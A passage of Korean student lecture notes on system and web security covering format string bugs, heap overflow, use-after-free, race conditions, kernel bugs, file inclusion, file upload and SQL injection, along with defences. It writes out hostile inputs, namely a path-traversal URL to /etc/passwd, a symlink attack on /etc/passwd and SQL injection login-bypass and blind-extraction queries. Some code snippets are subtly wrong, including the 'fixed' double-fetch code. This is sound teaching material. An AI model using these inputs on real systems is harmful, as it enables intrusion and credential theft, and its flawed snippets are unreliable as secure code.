printf("%2$d", 100, 200, 300, 400)  // prints "200"
```
- "몇 번째" 값이 너무 멀리 있을 때 위 예시의 `%11x`를 반복해서 입력하는 게 아니라 바로 불러올 수 있다.
- ex) arg57 불러오기 -> `%56$s`

그럼 한 번 정리해볼까?
#### 🔫 Wrap-up of FSB Attack Scenario
1. %d: register와 stack에 있는 값을 dump 할 수 있다.
2. %s: 
3. %n: 
4. $: 목표 buffer가 너무 멀리있는 경우 이걸 쓰면 편하다.

그럼 printf를 저런식으로 공격할 수 있을까?
한 번 실제 예시를 봐보자 `진짜 있다.`

`15p.`
Format string bug in sudo Program:
```c
...
sprintf(fmt2, "%s: %s", argv[0], fmt);
fprintf(stderr, fmt2, ...);
```
symbolic link를 통해서 공격이 가능하다.
쉽게 말하면 linux 바탕화면에 바로가기를 만들고 %n, %n...등을 넣어서 실행했다는 뜻이다.

sudo 프로그램은 프로그램 특성상 SUID bit가 들어있기 때문에 결과적으로 root 권한으로 상승 가능한 priviledge exploit가 가능하게 된다.

`강의자료 15p. 및 Assigned CVE-2012-0809: `
	누군가 발견한 취약점들 CVE-연도-번호

`16, 17p. 수업 못들음`

# 7. Heap Vulnerability

동적 메모리 할당에 대해서 간단하게 얘기해보자.
`malloc(), free()`같은 함수를 호출할 때 무슨 일이 일어나는가?

mamory allocator가 필요에 따라 heap 영역의 크기를 늘리는 `sbrk()` 시스템 콜을 호출한다.
Heap Memory Section에는 작은 Memory Block(Chunk)들이 만들어지고 관리된다.

**malloc()**
`malloc()` 함수 내부 코드는 어떤 것을 하냐?
몇 Byte의 요청이 들어오면 그 크기에 맞는 빈 Block을 찾아서 Return하고 할당
아직 Allocated되지 않은 Block들은 Free Block이라고 한다.

시스템프로그래밍을 상기하자.
Memory Allocator는 Free Block을 Doubly Linked List 구조로 관리된다.
알맞은 Size의 Block을 Free Block을 탐색하며 Return하거나
Free Block의 크기가 더 크거나 하면 Split이 되고 Return될 수도 있다.
Allocate 전과 후의 차이는 `6p`.와 `7p.`를 보자.

**free()**
그럼 이제 `free(q)`를 호출하면 어떻게 될까?
단순히 Allocated Block이 Free가 되며 Free Block Doubly Linked List에 추가된다.
어떻게 추가될지는 정책에 따라 다르다.

**Metadata**
그럼 Metadata가 포함된 Block의 구조를 생각해보자.
Block을 가리키는 Pointer가 실질적으로 Block의 맨 앞을 가리키는 게 아니다.
동적 메모리 할당을 위한 Block의 정보를 또 저장해야되기 때문이다.
그 내용은 Allocated된 Block과 Deallocated된 블록이 서로 다르다. `10p.`
이 역시 시스템프로그래밍을 상기하자.

이제 이를 바탕으로 Heap의 BOF와 Use-After-Free를 배워보자.

## 7.1 BOF in Heap

Heap에서 역시 Stack과 비슷한 이유로 BOF가 일어난다.
- 안전하지 않은 lib 함수들을 불러오거나
- 배열의 임의의 index에 접근하거나

`malloc()`을 쓴다는 것은 기본적으로 사용자 입력으로 주어진 값을 고려하겠다는 것이다.
다음 코드를 보자.
```c
uint item_count = read_uint(); 
int *arr = (int*) malloc(item_count * 4); // intis 4-byte
if (arr == NULL)
	return;
uint idx = read_uint();
if (idx < item_count)
	arr[idx] = 1;
```
얼핏보면 안전해보일 것이다.
item_count라는 값이 0x4라는 값으로 wrap-around되게 된다.
그렇게 되면 `idx` 값으로 어떤 값을 줘도 배열의 크기보단 작으니까 접근 가능하게된다. `Integer Overflow`

🔫 그럼 Heap에서의 BOF는 어떻게 악용 가능할까?
일단 Heap 영역에는 Saved Return Address는 없다는 것을 상기하고 가자.
1. Heap에 할당되어있는 구조체의 내용을 수정하여 공격할 수 있다. `Control Hijack`
2. Medata 부분을 조작하여 문제를 일으킬 수 있다.

그럼 위 사례의 첫 번째 경우에 대해서 자세히 말해보자.
**1. Corruption of Sturcture/Object**
```c
structS {
	charbuf[16];
	void(*handler)(char *s);
};

void f(void) {
	struct S *s = malloc(sizeof(struct S));
	gets(s->buf); // Buffer overflow (may corrupt "handler")
	s->handler("input msg");
}
```
이렇게 handler를 Overwrite하게 되면 사실상 오염시킨 대상 (return address -> 구조체) 빼곤 똑같은 공격이 가능하게 된다.

Virtual table: 비단 C 뿐만이 아니라 C++의 객체도 위와 같이 Overwrite되면 위험한 것들이 많다.

**2. Corruption of Metadata**
일단 Next와 Prev만 집중적으로 보자
그렇다면 어떤 공격이 일어나게 될까?
Free Block 연산 시 위험한 Memory 연산이 일어나게 된다.
```c
// Assume Next or Prev Corrupted!
remove_from_list(b) {  // Allocate 시 알맞은 Block을 찾았을 때
	Block *n = b->next;
	Block *p = b->prev;
	n->prev = p;
	p->next = n;
}
```
이렇게 되면 `n`또는 `p`를 해커가 지정한 임의의 주소로 덮어쓸 수 있게 되면서
공격자 입장에서는 임의의 주솟 값을 자신이 의도한 임의의 주솟값으로 덮어쓸 수 있게된다.

그래서 요즘 Memory Allocator들은 안전빵을 넣어놓는다.
```c
#define unlink(P, BK, FD) {  // 앞의 remove_from_list(b)와 같은 역할
	FD = P->fd;
	BK = P->bk ;
	if (FD->bk != P || BK->fd!= P) error(); // Validation
	else {
		FD->bk = BK;
		BK->fd= FD;
	}
}
```
정상적인 상황이라면 나의 다음 Node로 갔다가 다시 돌아왔을 때 나 자신으로 돌아와야한다는 것을 이용해 검증 Logic이 추가되었다.
하지만 이것도 우회하는 것이 가능하긴 하다.

## 7.2 Use-After-free (UAF)

말 그대로 이미 `free()`로 deallocated된 Heap 공간에 접근하는 것
다른 옛날 이름으론 dangling pointer라고도 한다.

다소 멍청한 코드일지도 모르지만 예를 들기위해 일단 봐보자.
```c
struct S {
	int x;
	...
};
struct S *s = (struct S*) malloc(sizeof(struct S));
...
free(s);
...
printf("x = %d\n", s->x); // Accessing deallocated memory
```
그럼 무엇이 읽혀나올까?
쉽게 얘기하면 예측할 수 없다.

그럼 좀 더 그럴싸한 예제 두 개를 보자.
```c
struct S *s1 = (struct S*) malloc(sizeof(struct S));
struct S *s2 = s1;
px = &(s1->x);
...
free(s1); // OK, let’s not use 's1' anymore
... // But forgot about 's2' or 'px'
s2->x = 100;
printf("x = %d\n", *px);
```
쉽게 말하면 `아 맞다 free한 거 까먹었다..` 라는 상황이다.

```c
struct S* items[32]; // Each element is a pointer to struct

void delete(intidx) {
	if(idx< 0 || idx>= 32)
		return;
	if (items[idx] != NULL) {
		free(items[idx]);
	}
	// Didn’t we forget something here?
}
```
쉽게 말하면 `어라 누굴 free 했었지..?` 라는 상황이다.
어떤 idx를 free했는지 기록할 필요가 있을 것이다.

`25-27p. 놓침`

그럼 이 취약점을 어떻게 이용해서 control hijack을 일으킬 수 있는걸까?

#### 🔫 Exploiting Use-After-Free

다음 코드를 살펴보며 어떻게 공격이 진행되는 건지 알아보자.
```c
struct Data *p = (struct Data*) malloc(sizeof(struct Data));
...
free(p);
...
len = read_size_t();
char *str = (char *) malloc(len); // Will read in string
..
p->handler(p->buf); // Use-after-free Heap memory block
```

`len` 값을 잘 조정해서 
`str`과 `p`가 같은 곳을 가리키고 있는 상황을 억지로 만들어낼 수 있는 것이다.
`p`가 가리키고 있는 곳이 다시 allocated된 block이 되는 것이다.
그리고 만약 `str`이 user input string이면 

`+)` Stack에서의 User-After-Free
그리고 Stack에서도 User-After-Free가 일어날 수 있긴 하다.
물론 stack에선 malloc은 없지만 만약 지역 변수의 pointer를 반환하려고 하는 경우는 생각해보면 UAF와 비슷하다. 지역 변수는 함수가 종료되면 자동으로 deallocated 되기 때문이다.

`+)` Uninitialized Data/Variable Use
UAF는 이제 더이상 사용하면 안되는 메모리에 접근하는 것으로 생각할 수 있다.
그와 반대로 아직 사용하면 안되는 메모리에 접근하는 경우도 생각해볼 수 있다.
이와 같은 것이 Uninitialized Data/Variable Use인데 이것 역시 많은 문제를 일으킬 수 있다.
```c
void f(void) {
	struct S s;
	read(0, s.buf, 32); // Using uninitialized pointer value
}
```

# 8. Type Confusion and Race Condition

남은 Expoit방법 짜투리 두 개

## 8.1 Type Confusion

서로 다른 구조체를 가리키고 있는 포인터 p1, p2가 있다.
그런데 우리가 그림처럼 p2를 p1을 가리키게 하면 어떻게 될까?
`char* ID` -> `int n`, `void *handler(void)` -> `char[buf]`, `int data[8]` -> ??? 가 될것이다.

우선 다음으로 넘어가기 전, C에서의 Type Casting을 복습해보자.
C에서는 inherit의 개념이 없기 때문에 C에서는 Type Casting을 통해 이를 구현하고자 한다.

```c
struct packet {
	int kind;
};

//packet.kind == 1
struct packet_A {
	int kind;
	char header[4];
	int data[8];
};

// packet.kind == 2
struct packet_B {
	int kind;
	char header[8];
	uint32_t len;
	...
};

// Type Casting을 통한 상속 야매 구현
void f(struct packet *p) {
	if(p->kind == 1) {
		struct packet_A *pa = (struct packet_A*) p;
		// Process as packet_A type
		...
	}
	else (p->kind == 2) {
		struct packet_B *pb = (struct packet_B*) p;
		// Process as packet_B type
		...
	}
};
```

그런데 상속이 구현된 C++이라고 Type Casting을 안 쓸수 있는 건 아니다.
여전히 어쩔 수 없이 써야하는 부분이 존재한다.

```cpp
class Packet { ... };

class PacketA: Packet { ... };
class PacketB: Packet { ... };
```

Down Casting: `부모 구조체` -> `자식 구조체`
Up Casting: `자식 구조체` -> `부모 구조체`

Up Casting은 그나마 안전하지만, Down Casting은 위험할 수 있다.
하지만 Down Casting을 안 쓸수는 없는 노릇, 우리는 `static_cast`를 통해 Down Casting을 할 수 있으나, 아무런 검사도 하지 않고 Type Casting을 시켜버리는 것이기 때문에 PacketA의 부모가 Packet이라는 확신이 있을 때만 쓰자.
```cpp
PacketA *pa = static_cast<PacketA*>(p);
```

검사를 안 방법이 있으면, 반면에 검사를 하는 방법도 있다. 이는 `dynamic_cast`를 통해 Down Casting을 하면된다. 우리는 좀 더 안전하게 Type Casting을 할 수 있을 것이다.
```cpp
PacketA *pa =  dynamic_cast<PacketA*>(p);
```

그렇다면 여기서 만약에, `static_cast`를 확신이 없을 때, 즉 함부로 잘못 사용하면 어떻게 될까? 자칫하면 `4p.`와 같은 일이 벌어질 수 있다.

실제로 다음과 같은 Type Confusion Error가 있었다.
```cpp
SVGElement* SVGViewSpec::viewTarget() {
	if (!m_contextElement)
		return 0;
	return static_cast<SVGEElement*>( // static_cast -> dynamic_cast << safe!!
		m_contextElement -> treeScope() -> getElementById(
			m_viewTargetString
		)
	);
}
```

따라서 Type Confusion은 개발자 자체의 실수`Logical Error`로도 일어날 수도 있고,
BOF를 통해서도 일어날 수 있다.

이정도로 해서 Type Confusion의 얘기는 끝내자.

## 8.2 Race Condition

일단 Race Condition을 위한 배경지식을 알아보자.

지금까지는 Control Flow가 하나만 있다고 가정하고 Exploit 시뮬레이션을 돌려왔었다.
하지만 현실세계의 코딩은 그렇게 간단하지 않다. 당장 운영체제에서 배우고 있지 않은가?

/ Multiple Execution Flow
Process: 실행중인 Program의 Instance
Thread: Process 안에서 실행 중인 더 작은 Control Flow Unit

코어가 하나 있다고 가정할때, 우리가 의식하지 못하는 순간에도 Context Switch가 일어나며 프로그램이 실행되고 있다.

![300](../../../../z.%20Docs/img/Pasted%20image%2020241107125852.png) ![300](../../../../z.%20Docs/img/Pasted%20image%2020241107125923.png)
Process State = registers + Memory + $\alpha$
- 각각의 Process는 별개의 Memory Space를 가지고 있다.
- 각각의 Thread는 별개의 Logical Control Flow와 Stack Area를 가지고 있다.

#### Race Condition
> Broad Meaning: 스케줄링 양상에 따라서 프로그램의 실행 결과가 달라질 수 있는 것
> `어떨 때는 출력값 99, 어떨 때는 100, 어떨 때는 101을 내놓는 현상`
> In Security: 

/ Time-of-Check to Time-of-Use (TOCTOU)
Race Condition으로 인해서 나타날 수 있는 취약점
- Time-of-Check: 프로그램의 어떤 것을 사용하거나 하기에 안전한지 체크하는 것
- Time-of-Use: 
문제는 Check를 통과한 Reaource가 Unsafe 하게 바뀔 수도 있고,..

예제를 보며 이에 대해 살펴보자.

**Race Condition Example**
(1) Root Previlege로 실행되는 Program
```c
// Pseudo-code of program P
if ("/tmp/my_temp" already exists) {
	exit(1);
}
else {
	Open "/tmp/my_temp" and write some data threr
}
```
!) 2번째 줄과 6번째 줄의 미묘한 간격을 노리고 Attacker가 다음과 같이 공격하게 된다.
![600](../../../../z.%20Docs/img/Pasted%20image%2020241112123024.png)
- `/tmp/my_tmep`라는 파일의 바로가기 `/etc/passwd`가 생성됨
- 저 바로 가기를 타고가서 `/etc/passwd`라는 파일을 write하게 된다.
- 이 `/etc/paswd`라는 파일에 Root Privilege 성격의 프로그램을 통해 exploit할 수 있게 되는 것이다.

(2) 강제 송금
```c
void transfer(int sender_id, int receiver_id, int amount) {
	if (amount < 0) return;
	if (balance[sender_id] < amount) return;
	...// Update receiver's balance accordingly
	balance[sender_id] -= amount;
}
```
!) 여태 배운 것 `amount < 0, BOF`말고 Race Condition에서 다음과 같이 공격하게 된다.
![600](../../../../z.%20Docs/img/Pasted%20image%2020241112123427.png)
- Line3까진 무사히 실행이 되었다고 가정하자.
- receiver 입장에서 두 번 돈을 받게 되고 sender입장에서 강제로 두 번 돈을 보내게 된다.
- 예를들면 1000원을 한 번 보내고 내 통장이 0원이 되어도 이미 Line3에서 보내도 된다는 허락이 떨어졌기 때문에 강제로 돈이 한 번 더 보내져서 -1000원이 되는 것이다.

#### 🛡️ Mutex
> 위와 같은 문제들은 Mutex로 어느정도 예방이 가능하다. `완전한 해결책은 아님`
![600](../../../../z.%20Docs/img/Pasted%20image%2020241112124104.png)

그럼 다 Mutex로 예방하면 되지 왜 아직도 위와 같은 문제들이 남아있냐 하면 Mutex가 완전한 해결책은 아니기 때문이다. 
- Performance Overhead도 일어날 수도 있고,
- DeadLock이라는 심각한 문제도 발생할 수 있다. 예를 들면 Signal Handler에서 Mutex를 잡으면 Deadlock이 발생할 수 있다. `위의 그림`

이 개념에 대해서 완전히 이해할 필요는 없고 Mutex가 완전한 해결책이 아니라는 점만 상기하고 넘어가자.

# 9. Kernel Security

이제 시스템프로그래밍을 들었고, 운영체제를 배우는 우리에게 익숙한 코드에 대한 보안취약점에 대해서 이야기해보자.

전에는 User Code에서 일어나는 코드의 보안 취약점에 대해서만 이야기 해왔다.
그럼 이제 Kernel Code로도 들어가보자는 것이다.

Kernel Code란 무엇이냐?
좀더 높은 권한을 가지고 있으며, OS의 핵심 부분이다.

System Call에 대해서도 복습하자.
Code로 Register를 잘 세팅하고 권한이 높은 Kernel의 Function을 부르는 것으로 생각하면된다.

![600](../../../../z.%20Docs/img/Pasted%20image%2020241112125707.png)
⚫: User Level에서는 무슨 짓을 해도 접근할 수 없다.
🔴: Syscall을 호출하면 왼쪽과 같이 접근 가능하도록 바뀐다.
Syscall을 호출하는 순간 %rip(Program Counter)의 위치가 왼쪽과 같이 Kernel Code를 가리키게 되고, Syscall을 처리하기 위한 여러가지 Inst들이 실행되게된다.

이제 System Call Handler가 등장할 차례이다.
우리가 Pintos에서 짰던 `syscall.c`를 상기하자.
- Memory Check를 시행하고
- Stack에서 올바른 Argument를 잘 전달하고
- Kernel Code를 실행한다.
이를 위해 System Call Handler는 위 그림에서 0-4GB까지의 영역에 모두 접근할 수 있다. 

## 9.1 

우리가 여태 배웠던 BOF와 같은 공격이 Kernel Code에서도 일어날 수 있다. `strcpy()`
따라서 보안을 위한 철칙 한가지가 있다.
> Kernel must not Trust User-Provided arguments.

그런데 Kernel Code에서만 일어날 수 있는 취약점도 존재한다.
이에 대해서 알아보자.

#### Using User-Provided Pointer without Check
```c
read_handler(int fd, void *buf, size_t n) { 
	.. // Read in the file content
	memcpy(buf, file_content, n);
	return 0; 
}
```
여기서 buf는 User-Provided Pointer이다.
!) 그 buf를 User Space가 아닌 Kernel Space를 가리키는 Pointe로 설정하면 어떻게 될까?
- 공격자가 Kernel Memory를 덮어쓸 수 있게된다.

이 부분은 배웠을 것이다. 따라서 기억이 나야 하는데 기억이 안난다면 PintOS Manual 3.1.5이 내용을 보면서 다시 복습하자. `11p.`

다음은 Real-World에서의 예시이다.
```c
// arg 포인터에 대한 검사도 진행되어야 한다.
...
SyscallHandler(struct Str* arg) {
	wchar_t *buf = arg->buf;
	ushort len = arg->len; // wchar_t는 2byte이므로 이는 항상 짝수
	if (len & 1) {
		LogError(...);     // 그래서 웬만해선 이곳에 진입하지 않는다.
	}
	else if (IsKernelSpace(buf)) { // Why "else-if"?
		return;
	}
	... // Access 'buf' here.
}
```
	왜 else가 아니라 else-if라고 하는걸까?
	LogError는 return하는 게 아니라 정정 후 process를 계속 진행하기 위한 함수이다.
	따라서 LogError 후에도 IsKernelSpace를 건너뛰지 않도록 else if를 쓰는 것이다.

#### Double Fetch


다음 코드에서의 취약점을 한 번 봐보자.
```c
SyscallHandler(structStr* arg) {
	charkbuf[128];
	if (IsKernelSpace(arg->buf) || arg->len >= 128) { 
		return;
	}
	memcpy(kbuf, arg->buf, arg->len); 
	..
```

!) 만약 t1에서 통과한 왼쪽의 값을 t2에서 오른쪽과 같이 바꿔놓으면 한 번 더 fetch를 해서 TOCTOU문제를 일으킬 수 있게된다.
![250](../../../../z.%20Docs/img/Pasted%20image%2020241114123021.png) ![350](../../../../z.%20Docs/img/Pasted%20image%2020241114123041.png)

🛡️ 위 문제를 다음과 같이 방지할 수 있다.
```c
SyscallHandler(structStr* arg) {
	charkbuf[128];
	char *buf = arg->buf; // Copy arguments to local variable
	intlen= arg->len;
	if (IsKernelSpace(arg->buf) || arg->len >= 128) { 
		return;
	}
	memcpy(kbuf, arg->buf, arg->len); 
	..
```
Local Variable, 즉 Stack은 Thread마다 따로인 값이기 때문에 두 번 fetch(Double Fetch)를 해서 위와 같은 문제가 일어날 위험이 없다.

#### Null Dereference

/ In User Code
User Code에서 NULL pointer를 사용하면 Denial-of-service Attack은 가능하지만,
Memory Disclosure 같은 공격은 불가능하다.

/ In Kernel Code
하지만 NULL Defferece가 Kernel에서 일어난다면 문제는 심각해진다.

```c
int x, *p = NULL;
if(...) {
	p = &x;
}
*p = secret_key;// What if p is NULL?
...
fptr_table[i](100); // What if fptr_table[i]is NULL?
```
!1) `p`가 NULL pointer인 상태로 5번째 줄에 도달하거나,
!2) `fptr_table[i]`(함수포인터)가 잘못돼서 NULL Pointer이거나

User Code면 그냥 Seg Fault만 뜨고 Program이 다운된다. `메데타시 메데타시`
하지만 Kernel Code라면 요상한 일이 일어난다.

![600](../../../../z.%20Docs/img/Pasted%20image%2020241114124101.png)
다음과 같이 NULL(Address 0)은 User 영역에 존재한다.
- 따라서 Memory Allocate가 가능하게 되는데, `malloc()`으로는 할 수 없고 `mmap()`이라는 좀 더 low level 함수를 사용하면 가능하다. `!1)`
- 더 심각하게는 함수포인터 `fptr_table[i]`로 0번지에 할당한 메모리를 이용하여 shell code같은 것을 실행시킬 수 있다. `Priviledge Escalation`, `!2)`

🛡️ 따라서 사람들은 다음과 같이 방어를 했다.
- SW Level:
	- 주소 0에 Memory Allocation 금지
	- `mmap_min_addr`라는 Prarameter로 User가 이 밑으론 Memory Allocation을 하지 못하도록 한다.
- HW Level:
	- SMEP(Supervisor Mode Execution Prevention): Kernel Mode의 CPU가 User영역의 Code를 실행시키는 것을 막는다.
	- SMAP(Supervisor Mode Access Prevention): Kernel Mode의 CPU가 User영역의 Data에 접근하는 것을 막는다.
		- 근데 항상 막으면 안 되고, System Call Handler가 User영역의 Data를 Fetch해와야 할때는 SMAP를 Disable한다.

`21p.` 의 교훈들을 가볍게 살짝 보자.

다음은 부록에 해당하는 내용으로, Kernel에서 추가로 일어날 수 있는 하나의 취약점이다.
`시험 범위에는 해당되지 않는다.`

#### Memory Disclosure due to Alignment

```c
structTime {
	intsecond;
	longnano_sec;
};

gettime_handler(structTime *arg) {
	struct Time t;
	if (is_kernel_space(arg)) {
		return;
	}
	// Set each field of the local struct
	t.second= ...;
	t.nano_sec= ...;
	memcpy(arg, &t, sizeof(struct time));
}
```


# 10. Web Security

World Wide Web을 우리는 오늘날 정말 많이 사용한다.
이에 따라 이곳에서의 보안도 중요해지는데, 이 챕터에서 바로 이에 대해서 이야기 할 것이다.
아마도 마지막 챕터가 될 것이다.

본격적으로 들어가기 전에 당부할 것이 있다.
본 강의에서 배우는 Expoit 방법들을 실제 세계의 Web에서 절대 실험해보지 않길 바란다.
~~빨간 줄 그이고 싶지 않으면~~

그럼 어떻게 실습을 하지? 라는 의문이 들 수도 있는데,
실습 과제는 제공되지는 않을 것이고, 다음 사이트에서 사용자 설정을 한 수 원한다면 실습을 진행하면 된다.
[digininja/DVWA: Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)

## 10.1 Background on the Web

#### Base Concepts

/ **URL(Uniform Reqource Locator)**
```
https://cs.sogang.ac.kr/cs/cs0_5.html?bbsConfigFK=1905
(Protocol://Host name/Path(of document?Query)
```
- Protocol: 규약
- Host name: DNS서버에서 처리
- Path: 어떤 파일을 요청하는지에 대한 명시
- Query: Client가 Web Server에 보내는 추가 요청 `data`

/ **HTTP(S)**
> Web Server와 Client간의 Request와 Responce의 프로토콜. `이런이런 형식으로 주고 받아야된다~ 이런 것이다.`
- HTTP(S): 안전하게 암호화된 프로토콜로, 도청이 불가능해진다.
- Example `9p.`

/ **HTML**
> Web Page의 Markup 언어
- 이를 프로그래밍 언어라고 부르면 곤란하게 생각하는 개발자들이 있다.
- Markup Tags `<body>, <img>, <p>`
- Hyperlink: 다른 Page로 리다이렉트

/ **JavaScript**
> Web Page에서 더 Dynamic한 상호작용을 할 수 있도록 한다.
- HTML과 JavaScript를 적절히 잘 섞으씀으로써 오늘날의 다양한 웹페이지들을 만들 수 있다.

/ **Cookie**
> Web Server가 사용자에 대한 이전의 정보를 기억할 수 있게 하는 것
- HTTP Protocol은 상호작용이 끝나면 Connection이 사라지기 때문에, Web Server에 Cookie라는 작은 조각을 넣어놔서 이걸로 사용자를 Identify한다.
- 로그인 해놨던 사이트를 다시 들어가니 로그아웃 되어있는 경우는 바로 Client가 일정시간이 지나면 Cookie를 Expire 시켜버려서 사용자 정보가 사라져서 그런 것이다.

#### Server-side code and Backend Database

이제 본격적으로 들어가기 전에, Server-Side Code라는 용어에 대해서 살펴보자.

/ **Server-Side Code**
Static Website: 웹페이지의 내용이 고정되어 있는 것
Dynamic Website: 웹페이지의 내용이 동적으로 변하는것, Web Server에서 뭔가 코드가 계속 돌아가고 있다는 것이다. Web Application이라고 하기도 한다.

이 Web Server 쪽에서 돌아가고 있는 모종의 코드를 Server-Side Code라고 하며, 이는 다양한 언어로 작성될 수 있다.
- PHP, Python(Django), Java(Spring), Ruby (Ruby on Rails), JavaScript (node.js)
우리는 이 중에서 PHP Language의 취약점에 대해서 자세히 얘기할 것이다. `그렇다고 PHP 언어에 국한될 필요는 없고, 옛날 언어라 취약점이 많아 이를 이용하는 것 뿐이다.`

/ **PHP**
Client가 Request를 보내면 Web Server는 다음과 같은 Server-Side PHP Code를 실행하고, 다음 코드의 수행 결과를 Response에 담아 Client에 보내게 된다.
```php
<?php
echo "<html>Hi</html>"
?>
```

그럼 Web Server는 필요한 정보들을 어디에 저장해놓을까?
바로 Database에 저장해놓는다.

/ **Database**
DB는 Server쪽에서 다음과 같은 정보들을 저장하고 있다.
- 포스트, 댓글 등
- ID, Password, 로그인 정보 등
Server-Side Code에서 Data를 요청하는 Query를 보내면 DB가 Data를 다시 Server--Side Code로 보내게 되는 것이다.

그럼이제 본격적으로 취약점을 알아보기 전에 Threat Model을 살펴보며 전체적인 공격 양상을 알아보자.


Threat Model (1)
![450](../../../../z.%20Docs/img/Pasted%20image%2020241121124348.png)
선량한 Web Server에 악의적인 Attacker User가 공격하는 상황

Threat Model (2) 
![450](../../../../z.%20Docs/img/Pasted%20image%2020241121124409.png)
선량한 User가 악의적인 Attacker의 Web Server에 접속하는 상황
Response를 Attacker가 직접적으로 조작할 수 있다.

Threat Model (3)
![450](../../../../z.%20Docs/img/Pasted%20image%2020241121124423.png)
악의적인 사람이 URL링크를 보내서 선량한 User가 Web Server에 접속하면 위험에 노출되게 되는 상황 `삼자대면`

Threat Model (4)
![450](../../../../z.%20Docs/img/Pasted%20image%2020241121124435.png)
(3)같은 상황에서 Attacker가 자신만의 Web Server를 또 추가적으로 운영하고 있는 상황

## 10.2 Various Vulnerability and Attacks in the Web

그럼이제 본격적으로 취약점들에 대해서 알아보자.

#### ⚠️ File Inclusion Vulneribility `Thread Model (1)`

Server-Side Code에서, 다음과 같이 하나의 Code File이 다른 File을 Include할 수 있다.
```php
 <?php
	 include 'intro.php'; // 환영 문구 띄우기
	 include 'menu.php';  // 메뉴 띄우기
	 ...
 ?>
```
가독성을 위해 Module화를 하며 File들을 기능별로 분리한 뒤에 그 File들을 각각 가져다 쓰는 것이다.

그럼 이제 취약점을 알아볼까?

어떤 Web Site의 페이지의 `JOIN` 버튼을 누르면 다음과 같은 `php` File이 실행되어 `feature`에 해당하는 내용을 불러오게 된다고 하자.
```php
<?php
 include $_GET['feature'];
 ?>
 // `$_GET[ ]`: 위에서 한 URL내용 중 '?'의 뒷부분에 해당하는 내용을 전달하는 것
 // 위에서 include는 C 언어에서의 그것과 같은 기능을 하는 것이라고 생각해도 된다.
```

feature에 해당하는 내용은 위의 URL에서 배운 것처럼 '?'뒤에 다음과 같이 붙어있다.
```URL
www.target.com/a.php?feature=join.php
```

그렇다면 URL 내용을 Attacker가 다음과 같이 잘 조작해서 다음과 같이 수정하면 어떻게 될까?
```URL
www.target.com/a.php?feature=../../../../etc/passwd
```
우리는 이제 웹페이지를 입력하는 창에 위와 같은 내용을 집어넣는것 만드로도 비밀번호를 읽어올 수 있게 되는 것이다.

🛡️ Prevecting File Inclusion Attack
- 간단하게 문자열 패턴 검사를 한다. `'../' 없애기`
- `$_GET['feature']`에 해당하는 내용을 특정한 것만 불러올 수 있도록 Allowed List를 만든다.
근데 그냥 File Inclusion 기능을 없애버리기도 한다.

#### ⚠️ File upload Vulnerability

우리가 게시판에 첨부 파일을 올렸다고 하자.
그렇다면 그 첨부 파일은 Web Server의 특정 디렉토리에 저장될 것이다.
보통 DB에 넣기보단 Linux(Web Server)의 File System에 저장된다.

`files/A.pdf`라는 파일과 연결되는 Link가 우리의 게시글과 함꼐 저장되게 된다.

그럼 Attacker는 이를 어떻게 공격할까?

🔫
공격자가 `A.pdf`가 아니라 PHP 확장자를 가지는 공격 코드 `A.php`를 보내면, Web Server에서 이를 실제로 실행해야 할 코드로 인식하게 되고 해당 파일을 Attacker가 접근 할 시 악성 코드를 실행하게 된다.

🛡️
막는 방법은 간단하다.
- `.php` 확장자의 파일은 안 받으면 된다. `.pht`라는 확장자도 안된다. 이도 역시 실행해야 할 PHP 코드로 인식하기 때문이다. `이거 말고도 몇 개 더 있다.`
- 또는 `<?php`라는 태그를 포함한 파일을 안 받을 수도 있다. 하지만 이렇게 일일이 deny-list를 작성하는 것이 위험한 이유는, 우리가 모든 경우를 막을 수 없기 때문이다. 예를 들어, `<?php`가 아니라 `<?`만 작성해도 PHP로 인식된다.
- 따라서 좀 더 안전하고 범용적인 방어 방법은 업로드할 Directory를 Non-Executable하게 하는 것이다.

#### ⚠️ SQL injection Vulnerability

먼저 시작하기 전에 간단한 배경지식을 알고 가자.

/ **GET vs POST**

GET
```php
GET /login.php?id=jason&pw=asdf HTTP/1.1
Host: abc.com
...
```

POST
```php
POST /login.php HTTP/1.1
Host: abc.com
...
(Body) id=jason&pw=asdf
```

GET보다는 POST가 조금 더 안전하다.
POST와 비교되는 GET에서의 취약점이 뭔지 한 번 간단하게 말해보자면,
만약에 Browser History가 남아있는 상황에서 GET으로 Login을 하면 URL을 저장해놓는 Browser History에 내가 쓴 아이디랑 패스워드들이 남아있을 수도 있다.

그런데 HTTP를 쓰는 이상 Vulnerable한 것은 변하지 않는다.
그래서 HTTPS(Secured)를 쓰는 것이다.

이제 본격적으로 SQL이라는 것에대해서 알아보자.
`login.php`
```php
<?php
 $id = $_POST['id'];
 $pw = $_POST['pw'];
 $q = "SELECT * FROM user WHERE id='$id' AND pw='$pw'";
 $r = mysql_query($q);
 ?>
```

DB에 Table이 다음과 같이 형성된다.

|  id   |    pw    |       snn       | ... |
| :---: | :------: | :-------------: | :-: |
| jason |   asdf   | `990515-******` | ... |
| admin | qwer1234 | `970403-******` | ... |
|   :   |    :     |        :        |     |

` SELECT * FROM user WHERE id='jason' AND pw='asdf'`
사용자가 위와 같이 Query를 하면 Server-side Code가 DB의 Table에서 해당 내용을 가져오며 상호작용 하게된다.

🔫 **SQL Injection**
php의 `--`는 c의 `//`와 같다.
```php
SELECT * FROM user WHERE id=‘admin’ ––’ AND ...
```
- 위와 같이 Query를 보내면 뒷부분이 주석 처리가 돼서 DB에 들어가 있는 `admin`의 모든 행이 출력된다.
따라서 비밀번호를 몰라도 로그인이 가능하게 되는 것이다.

🔫 **Blind SQL Injection**
그런데 로그인은 가능해도 로그인 창에 `당신의 패스워드는 **** 입니다!` 라는 창이 뜨지는 않기 때문에, 여전히 Attacker는 실제 비밀번호가 무엇인지는 모른다.
하지만 확장된 Injection 방법을 쓰면 비밀번호를 알아내는 게 가능하다.

일단 Column이름이 'pw'라는 것을 알고있다는 가정 하에 다음과 같은 Query를 보낸다고 해보자.
```php
SELECT * FROM user WHERE id=‘admin’ ––’ AND SUBSTR(pw,1,1)==‘a’ --
```
- 위와 같이 Query를 보내면 뒷부분이 비밀번호의 첫 글자를 가져와서 'a'와 비교하는 함수가 된다.
따라서 One-by-one으로 확인해가며 하나 맞추고 그 다음은 `SUBSTR(pw,2,1)=='a'`... 식으로 보내어 Login에 성공했는지 여부에 따라 비밀번호의 실제 값을 알 수 있게된다.

`그러니까 우리가 실습 시험에서 푼 guess.c 문제가 그냥 빡치는 Bruth Force 문제가 아니라 상당히 자주 사용되는 Injection 기법이었다는 것이다..`

그럼 Column 이름은 어떻게 알아낼까? 이에 대해 간단하게만 알아보자.
- 그냥 개발자에 빙의하여 예상
